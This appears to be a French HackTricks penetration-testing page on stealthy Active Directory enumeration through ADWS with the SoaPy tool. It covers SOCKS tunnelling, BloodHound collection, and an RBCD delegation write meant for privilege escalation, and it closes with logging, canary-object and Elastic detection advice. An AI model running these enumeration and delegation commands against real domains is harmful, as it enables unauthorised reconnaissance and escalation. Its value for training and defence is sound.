# Enumeration et collecte discrète des services Web Active Directory (ADWS)

{{#include ../../banners/hacktricks-training.md}}

## Qu'est-ce qu'ADWS ?

Les services Web Active Directory (ADWS) sont **activés par défaut sur chaque contrôleur de domaine depuis Windows Server 2008 R2** et écoutent sur TCP **9389**. Malgré le nom, **aucun HTTP n'est impliqué**. Au lieu de cela, le service expose des données de style LDAP à travers une pile de protocoles de mise en forme .NET propriétaires :

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Parce que le trafic est encapsulé à l'intérieur de ces trames SOAP binaires et circule sur un port peu commun, **l'énumération via ADWS est beaucoup moins susceptible d'être inspectée, filtrée ou signée que le trafic classique LDAP/389 & 636**. Pour les opérateurs, cela signifie :

* Reconnaissance plus discrète – Les équipes bleues se concentrent souvent sur les requêtes LDAP.
* Liberté de collecter à partir de **hôtes non-Windows (Linux, macOS)** en tunnelant 9389/TCP à travers un proxy SOCKS.
* Les mêmes données que vous obtiendriez via LDAP (utilisateurs, groupes, ACL, schéma, etc.) et la capacité d'effectuer des **écritures** (par exemple, `msDs-AllowedToActOnBehalfOfOtherIdentity` pour **RBCD**).

> REMARQUE : ADWS est également utilisé par de nombreux outils RSAT GUI/PowerShell, donc le trafic peut se mélanger avec l'activité administrative légitime.

## SoaPy – Client Python natif

[SoaPy](https://github.com/logangoins/soapy) est une **réimplémentation complète de la pile de protocoles ADWS en pur Python**. Il crée les trames NBFX/NBFSE/NNS/NMF octet par octet, permettant la collecte à partir de systèmes de type Unix sans toucher à l'exécution .NET.

### Caractéristiques clés

* Prend en charge **le proxy via SOCKS** (utile depuis des implants C2).
* Filtres de recherche granulaires identiques à LDAP `-q '(objectClass=user)'`.
* Opérations d'**écriture** optionnelles ( `--set` / `--delete` ).
* Mode de sortie **BOFHound** pour ingestion directe dans BloodHound.
* Drapeau `--parse` pour embellir les horodatages / `userAccountControl` lorsque la lisibilité humaine est requise.

### Installation (hôte opérateur)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Le flux de travail suivant montre comment énumérer **les objets de domaine et ADCS** via ADWS, les convertir en JSON BloodHound et rechercher des chemins d'attaque basés sur des certificats – le tout depuis Linux :

1. **Tunnel 9389/TCP** depuis le réseau cible vers votre machine (par exemple via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exportez `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou utilisez `--proxyHost/--proxyPort` de SoaPy.

2. **Collecter l'objet de domaine racine :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Collecter les objets liés à ADCS à partir de la Configuration NC :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir en BloodHound :**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Téléchargez le ZIP** dans l'interface BloodHound et exécutez des requêtes cypher telles que `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` pour révéler les chemins d'escalade de certificats (ESC1, ESC8, etc.).

### Écriture de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combinez cela avec `s4u2proxy`/`Rubeus /getticket` pour une chaîne complète de **Resource-Based Constrained Delegation**.

## Détection & Renforcement

### Journalisation ADDS Verbose

Activez les clés de registre suivantes sur les contrôleurs de domaine pour faire ressortir les recherches coûteuses / inefficaces provenant d'ADWS (et LDAP) :
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Les événements apparaîtront sous **Directory-Service** avec le filtre LDAP complet, même lorsque la requête est arrivée via ADWS.

### Objets SACL Canary

1. Créez un objet fictif (par exemple, un utilisateur désactivé `CanaryUser`).
2. Ajoutez un ACE **Audit** pour le principal _Everyone_, audité sur **ReadProperty**.
3. Chaque fois qu'un attaquant effectue `(servicePrincipalName=*)`, `(objectClass=user)`, etc., le DC émet **Event 4662** qui contient le SID réel de l'utilisateur – même lorsque la demande est proxy ou provient d'ADWS.

Exemple de règle pré-construite Elastic :
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Résumé des outils

| Objectif | Outil | Remarques |
|----------|-------|-----------|
| Énumération ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lecture/écriture |
| Ingestion BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convertit les journaux SoaPy/ldapsearch |
| Compromission de certificat | [Certipy](https://github.com/ly4k/Certipy) | Peut être proxifié via le même SOCKS |

## Références

* [SpecterOps – Assurez-vous d'utiliser SOAP(y) – Un guide pour les opérateurs sur la collecte discrète d'AD en utilisant ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – Spécifications MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
